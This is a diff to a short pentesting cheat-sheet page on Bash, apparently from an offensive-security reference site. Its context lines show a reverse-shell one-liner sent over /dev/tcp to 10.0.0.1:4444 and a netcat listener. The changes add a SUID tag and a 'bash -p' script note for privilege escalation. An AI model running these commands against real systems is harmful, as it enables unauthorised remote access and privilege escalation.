@@ -1,7 +1,7 @@
 ---
 title: Bash
 desc: Executes shell commands and scripts. It also used to Reverse Shell, etc.
-tags: [Linux, PrivEsc]
+tags: [Linux, PrivEsc, SUID]
 alts: []
 website:
 ---
@@ -16,4 +16,14 @@ bash -i >&  /dev/tcp/10.0.0.1/4444 0>&1
 
 # Listen
 nc -lvnp 4444
+```
+
+<br />
+
+## Create Bash script
+
+```sh
+#!/bin/bash -p (-p: privilege mode. It's used for SUID)
+
+echo 'Hello World'
 ```
